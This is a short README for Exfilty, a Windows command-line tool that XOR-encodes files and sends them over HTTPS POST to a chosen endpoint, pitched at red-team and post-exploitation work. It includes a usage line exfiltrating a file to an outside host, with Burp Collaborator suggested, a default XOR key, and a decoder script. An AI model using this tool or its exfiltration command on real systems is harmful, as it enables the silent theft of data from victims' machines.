# Exfilty

**Exfilty** is a lightweight file exfiltration utility for Windows environments, designed for use in controlled environments such as red team operations, malware analysis labs, and post-exploitation research.

The tool performs HTTPS POST-based file transfer to a specified endpoint, applying a simple XOR cipher to obfuscate the file contents in transit.

---

## Features

- Minimal and portable Windows executable
- XOR-based payload encoding (configurable key)
- HTTPS POST with custom User-Agent
- Designed for silent file transfers in restricted environments
- Output fully reconstructable via provided Python script

---

## Usage
```bash
exfilty.exe https://your_endpoint> <file_to_exfiltrate>  # BurpSuite Collaborator recommended
```

The tool will read the file, apply XOR encryption using a predefined key, and send the result via HTTPS POST to the specified endpoint.

---

## Encryption Logic

Exfilty uses a symmetric XOR cipher with a static key (`secreta123` by default). This key must match on both ends of communication (sender and receiver).

You can reconstruct the original file using the provided `remounter.py` script:

```bash
python3 remounter.py <encrypted_file> <output_file>
